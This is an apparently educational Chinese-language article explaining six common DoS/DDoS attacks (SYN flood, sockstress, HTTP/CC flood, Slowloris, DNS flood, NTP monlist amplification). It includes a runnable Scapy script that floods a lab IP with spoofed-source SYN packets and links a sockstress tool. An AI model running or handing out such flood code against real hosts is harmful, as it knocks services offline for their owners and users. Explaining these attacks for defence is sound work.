常见的DOS/DDOS

1.SYN Flood

漏洞原理: 在建立TCP链接的时候,第三次握手时,攻击者恶意的不发ACK包导致服务器处于等待状态而导致资源耗尽

在正常情况下,建立TCP连接应该是这样的

客户端向服务器发送SYN数据包,服务端接收到后返回SYN-ACK包（此时服务器处于等待客户端返回ACK包的状态），客户端接收到SYN-ACK包后返回ACK包给服务端,服务端收到后二者建立TCP连接

如果服务端接收到客户端的SYN数据包但没有收到客户端的ACK包,服务端会认为自己发的SYN-ACK包丢失了(由于不可控因素,如网络不稳定),因此,服务端每个一段时间就会向客户端发送一个SYN-ACK包,请求和客户端建立连接.

由于服务端没有直接断开和客户端的连接,因此系统会在协议栈留一块缓存区来存储握手过程。这就导致了如果大量的肉鸡在短时间内向服务端发送SYN数据包,但并不发送ACK包,服务端在短时间内会建立大量的半开连接，使协议栈被占满而无法于正常用户建立连接

脚本如下

from scapy.all import *
import random
 
def synFlood():
    for i in range(10000):
        #构造随机的源IP
        src='%i.%i.%i.%i'%(
            random.randint(1,255),
            random.randint(1, 255),
            random.randint(1, 255),
            random.randint(1, 255)
            )
        #构造随机的端口
        sport=random.randint(1024,65535)
        IPlayer=IP(src=src,dst='192.168.37.130')
        TCPlayer=TCP(sport=sport,dport=80,flags="S")
        packet=IPlayer/TCPlayer
        send(packet)
 
if __name__ == '__main__':
    synFlood()

2.sockstress

原理: 在建立TCP连接后，攻击者会将数据包中window的值置为0（window的意思代表client这边一次可以接受的数据大小，置为0之后表示client没有window来接受server发来的数据，然后server就会分配内存来维持TCP连接直到client有空闲的window与之通信）

和SYN Flood一样,短时间内,大量肉鸡向服务器建立TCP连接,但缺让服务器消耗内存来等待就会导致服务器内存耗尽而无法提供正常的服务

与SYN Flood的区别是: SYN Flood是在TCP连接建立前，而sockstress是在TCP连接建立后

流量包特征可以在wireshark中分组详情里的数据链路层中看到window 0

https://github.com/defuse/sockstress

3.CC攻击

HTTP Flood，也叫CC攻击

原理: 让服务器不断的进行数据处理操作，使CPU长期处于100%的状态直至网络拥塞或者宕机

主要是用来攻击动态页面的

举例:访问论坛时，如果这个论坛比较大，访问的人比较多，打开页面的速度会比较慢，访问的人越多，论坛的页面越多，数据库压力就越大，被访问的频率也越高，占用的系统资源也就相当可观。

CC攻击就是利用多线程去访问，多少线程就是多少个用户，不停的向服务器发送大量数据包从而造成服务器资源耗尽或者宕机崩溃(由于使用了匿名代理,因此每个线程的发包的ip可能都不一样)

特点: ip是真实的,数据包都是正常的数据包,攻击请求时有效的,无法被拒绝；攻击的时网页，服务器可以ping通，但就是无法访问

4.Slowloris攻击

原理：HTTP协议默认在服务器全部接收请求之后才开始处理，若客户端发送速度缓慢或不完整，服务器时钟为其保留连接资源池占用，此类大量并发将导致DDOS

比如完整的HTTP请求结尾应该为 \r\n\r\n,而攻击者的HTTP请求结尾是 \r\n;此时服务器就会认为请求不完整,会等待攻击者将请求发送完整后才开始处理

5.DNS Flood

原理: DNS查询服务是建立在UDP协议的基础上，UDP协议面向无连接服务，因此源ip很容易被伪造。当伪造源地址为被攻击目标的地址，向递归域名查询服务器发起查询，当DNS服务器查询到结果后，就会将结果返回给伪造的源地址也就是被攻击目标，导致了被攻击目标接收到了大量的数据包。

举例: 你网购了东西，但地址填别人家的，这样快递小哥就会把你的东西放到别人家

6.NTP反射放大攻击

原理：NTP协议是基于UDP协议的而UDP协议面向无连接，因此客户端向NTP服务器提交monlist查询时的源ip很容易被伪造，进一步导致了NTP服务器不断的向被攻击服务器返回数据包。这一点跟DNS Flood很像。都是通过伪造ip，借刀杀人。

补充:

什么是NTP协议?
NTP是网络时间协议(Network Time Protocol)，它是用来同步网络中各个计算机的时间的协议
在计算机的世界里，时间非常地重要，例如对于火箭发射这种科研活动，对时间的统一性和准确性要求就非常地高，是按照A这台计算机的时间，还是按照B这台计算机的时间？NTP就是用来解决这个问题的，NTP（Network Time Protocol，网络时间协议）是用来使网络中的各个计算机时间同步的一种协议。它的用途是把计算机的时钟同步到世界协调时UTC，其精度在局域网内可达0.1ms，在互联网上绝大多数的地方其精度可以达到1-50ms。
NTP 服务器会向查询端返回与NTP 服务器进行过时间同步的最后 600 个客户端的 IP，响应包按照每 6 个 IP 进行分割，最多有 100 个响应包。由于NTP服务使用UDP协议，攻击者可以伪造源发地址向NTP服务进行monlist查询，这将导致NTP服务器向被伪造的目标发送大量的UDP数据包，理论上这种恶意导向的攻击流量可以放大到伪造查询流量的100倍。

总结:

基于TCP协议的攻击 ： SYN Flood ，sockstress 特点: 是服务器处于等待阶段

基于HTTP协议的攻击: CC , Slowloris 特点: CC 让服务器操作大量数据，使CPU始终处于满负荷状态;Slowloris也是使服务器处于等待阶段

基于UDP协议的攻击: DNS反射放大攻击, NTP反射放大攻击 特点: 请求包小,返回包大；源ip容易被伪造
